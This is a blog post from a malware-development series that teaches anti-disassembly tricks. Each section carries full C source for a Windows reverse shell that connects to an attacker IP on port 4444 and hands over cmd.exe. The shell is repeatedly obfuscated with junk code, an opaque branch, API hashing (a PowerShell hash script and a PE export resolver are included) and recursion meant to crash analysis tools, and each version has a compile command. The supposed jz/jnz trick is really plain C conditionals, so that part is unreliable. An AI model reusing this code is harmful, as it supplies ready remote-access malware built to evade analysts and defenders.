---
layout: post
title: 7 MALDEV - Anti-Disassembly Tricks
category : [Reverse, MALDEV]
tags: reverse
---

Here are a few commonly used strategies :
  - **API obfuscation** : changing names of identifiers, such as class names, method names, field names, arbitraty names.
  - **Opcode/assembly code obfuscation** : executables containing decrypted sections and instructions that areillegible or illogical
  - **Control flow graph (CFG) flattening** : I've made an other post about it in oalab category, but it's about breaking up nested loops and if statements, which are then concealed within large switch statement wrapped inside a loop.

Combining jz with jnz it allows to create jump instructions with same target. Jump is unrecognized by disassembler since it only disassembles instructions individually.

## Anti-Disassembly techniques

### clear C implementation

We start with our code from chapter 1 code from reverse shell windows :

```c 
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  // IP and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
  exit(0);
}
```

To obfuscate the opcode/assembly code we can employ multiple techniques, such as inserting useless instructions, modifying control flow and encrypting sections of the code.

### method 1 : junk code 

Here function *dummyFunction()* which makes meaningless calculations that don't affect main logic of malware but complicate its reverse engineering.

```c 

#include <winsock2.h>
#include <windows.h>
#include <math.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

// define a dummy function with math operations
void dummyFunction() {
  volatile int x = 0;
  x += 1;
  x -= 1;
  x *= 2;
  x /= 2;

  // Additional complex math operations
  double y = 2.5;
  double z = 3.7;
  double result = 0.0;

  // Perform math operations
  result = sqrt(pow(y, 2) + pow(z, 2)); // Calculate square root of sum of squares
  result = sin(result); // Calculate sine of the result
  result = cos(result); // Calculate cosine of the result
  result = tan(result); // Calculate tangent of the result

  // Use the result to perform more operations
  for (int i = 0; i < 10; ++i) {
    result *= i;
    result /= (i + 1);
    result += i;
  }

  // Use the final result to perform some conditional operations
  if (result > 100) {
    result -= 100;
  } else {
    result += 100;
  }
}

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

  // call the dummy function to insert junk instructions
  dummyFunction();

  exit(0);
}
```

#### compile 

```bash 
 x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
```

#### Reversing

![junk1](assets\images\maldev\7\junk1.png)

### method 2 : jz-jnz opcode 

#### Example 

```c 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // Combine jz with jnz trick without inline assembly
  int a = 1;
  if (a == 1) {
    // initiate cmd.exe with redirected streams
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
    // Jump to the next instruction
    if (a == 0) {
      // This block will never execute
      printf("This block will never execute\n");
    }
  }

  exit(0);
}
```
#### Compile 

```bash 
x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
```

#### Reverse 

![junk1](assets\images\maldev\7\junk2.png)

## Obfuscation of API and assembly code 

Obfuscation of API and assembly code is a technique that's employed to hinder reverse engineering efforts by making it difficult for disassembly analysis tools to accurately understand functionality of a program. This technique involves intentionally complicating code or data structures within a program to confuse disassemblers, resulting misleading program listing.

Typically accomplished through use of **API hashing**, a process in which names of API functions are replaced by a hashed value.

### Example 

#### PowerShell for calculating hash 

First we write simple PowerShell script for calculating hash of a given function name. Here it's **CreateProcess** string :

``` powershell
$FunctionsToHash = @("CreateProcess")
$FunctionsToHash | ForEach-Object {
  $functionName = $_
  $hashValue = 0x35
  [int]$index = 0
  $functionName.ToCharArray() | ForEach-Object {
    $char = $_
    $charValue = [int64]$char
    $charValue = '0x{0:x}' -f $charValue
    $hashValue += $hashValue * 0xab10f29f +
$charValue          -band 0xffffff
    $hashHexValue = '0x{0:x}' -f $hashValue
    $index++
    Write-Host "Iteration $index : $char : $charValue : $hashHexValue"
  }
  Write-Host "$functionName`t $('0x00{0:x}' -f $hashValue)"
}
```

#### Main C code

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

typedef int (WINAPI *CreateProcess_t)(
  LPCSTR, LPSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL, DWORD, LPVOID, LPCSTR,
  LPSTARTUPINFOA, LPPROCESS_INFORMATION
);

DWORD calcHash(char *string) {
  size_t stringLength = strnlen_s(string, 50);
  DWORD hash = 0x35;
  for (size_t i = 0; i < stringLength; i++) {
    hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
  }
  return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD hash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (calcHash(pFuncName) == hash) {
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // resolve function addresses 
  LPVOID address = getAPIAddr((char *)"kernel32", 0x005d47253);
  CreateProcess_t myCreateProcess = (CreateProcess_t)address;
  // initiate cmd.exe with redirected streams
  myCreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

  exit(0);
}
```

### Compile 

```bash 
 x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
```

One of the most popular techniques in real-life malware, including Carbanak, Carberp, Loki, Conti and others.

### Result

![junk1](assets\images\maldev\7\junk3.png)

## Crashing Malware Analysis tools *

Various techniques can be used such as using highly complicated recursive functions that make tools run out of memory and crash as well as the virtual machine.

### Example

```c 
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

// Define a highly complicated recursive function
int recFunction(int n) {
  // Base case
  if (n <= 0) {
    return 0;
  }
  // Recursive call
  return n + recFunction(n - 1);
}

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  int result = recFunction(1000000);

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

  exit(0);
}
```

### Compile 

```bash 
x86_64-w64-mingw32-g++ hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lws2_32
```

### Result 

Note : It did not crash on my machine but with higher value it may happen.

Trick popular techniques in real malware and tools such as Cobalt Stricke.
